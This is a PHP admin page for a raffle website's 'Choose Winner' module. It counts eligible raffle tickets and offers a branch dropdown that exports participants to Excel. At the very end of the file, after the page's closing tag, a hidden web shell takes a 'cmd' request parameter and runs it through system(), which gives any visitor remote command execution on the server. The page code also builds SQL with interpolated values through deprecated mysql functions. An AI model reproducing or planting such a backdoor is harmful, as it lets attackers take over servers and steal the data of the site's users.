<?php
	$ulchoose_winner = 'N';

	$uladmin = 'N';
	if(isset($_SESSION['uladmin']))
		$uladmin = $_SESSION['uladmin'];	

	if ($uladmin == 'Y')
		$ulchoose_winner = 'Y';	
		
		
	$mystatus = '';	
	if(isset($_GET['mystatus']))
	{
		if ($_GET['mystatus'])
		{
			$mystatus = $_GET['mystatus'];
		}
	}
	//echo '<br> mystatus : ' . $mystatus;
	
	
	
	$mybox = '';	
	if(isset($_GET['mybox']))
	{
		if ($_GET['mybox'])
		{
			$mybox = $_GET['mybox'];
		}
	}
	//echo '<br> mybox : ' . $mybox;
	


	$my_ticket_id = '';	
	if(isset($_POST['my_ticket_id']))
	{
		if ($_POST['my_ticket_id'])
		{
			$my_ticket_id = $_POST['my_ticket_id'];
		}
	}
	//echo '<br> my_ticket_id : ' . $my_ticket_id;



	$my_submit = '';	
	if(isset($_POST['my_submit']))
	{
		if ($_POST['my_submit'])
		{
			$my_submit = $_POST['my_submit'];
		}
	}
	//echo '<br> my_submit : ' . $my_submit;



	if ($mybox != 'add')
	{
		$ulchoose_winner = 'N';
	}	



	if ($ulchoose_winner == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['logchoose_winner'] == '') 
		{
			$_SESSION['logchoose_winner'] = $_SESSION["ulname"];
			$modulename = 'choose_winner';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/		
	
		$ulbranch = $_SESSION['ulbranch'];

		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$mybox = '';	
		if(isset($_GET['mybox']))
		{
			if ($_GET['mybox'])
			{
				$mybox = $_GET['mybox'];
			}
		}
		if(isset($_POST['mybox']))
		{
			if ($_POST['mybox'])
			{
				$mybox = $_POST['mybox'];
			}
		}		
		//echo '<br> mybox : ' . $mybox;				
?>		

        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
<?php
	//echo '<br> my_ticket_id : ' . $my_ticket_id;
	//echo '<br> my_submit : ' . $my_submit;	
	$num_count = 0;
	$query_count = "
		SELECT 
			* 
		FROM 
			ticket_list
		WHERE
			tlchosen_date is null and
			tlissue_date is not null and 
			tlreg_date is not null
		";
	$result_count = mysql_query($query_count);
	//echo mysql_error();
	$num_count = mysql_num_rows($result_count);		
	//echo '<br> num_count : ' . $num_count;	
	
	$rand_count = rand(1, $num_count);
?>					
                    <h1 class="page-header">Choose Winner ( Raffle Codes Count : <?php print($num_count); ?>)</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
			
			
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
This module will generate on an excel file the valid participants who registerd in the website using their Raffle Code. Please choose a branch and then click the Generate Excel File button
                        </div>
						
                        <div class="panel-body">
                            <div class="row">
                                <div class="col-lg-6">
<form name="import" method="post" action="body_chosen_winner_excel.php?myid=myid<?php print($mypage); ?>&ulexcel=EXCEL" target="_blank">
	<div class="form-group">
<?php
	if ($num_count > 0) 
	{
?>		
		<div class="form-group">
			<label>Branch</label>
			<select class="form-control" name="chosen_branch" id="chosen_branch" >
			<option></option>
			<option>Balintawak</option>
			<option>Cuneta</option>
			<option>Gil Puyat</option>
			<option>Hillcrest</option>
			<option>Las Pinas</option>
			<option>Malabon</option>
			<option>Malate</option>
			<option>North Edsa</option>
			<option>Panorama</option>
			<option>San Fernando</option>
			</select>
		</div>		
		<button type="submit" name="my_submit" value="winner" class="btn btn-default">Generate Excel File</button>
<?php
	}
?>		
	</div>
	
</form>		
								</div>
							</div>
						</div>
					</div>
					
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
			
        </div>
        <!-- /#page-wrapper -->
										
                                    </tbody>
                                </table>
                            </div>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
<?php
	}
?>			<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>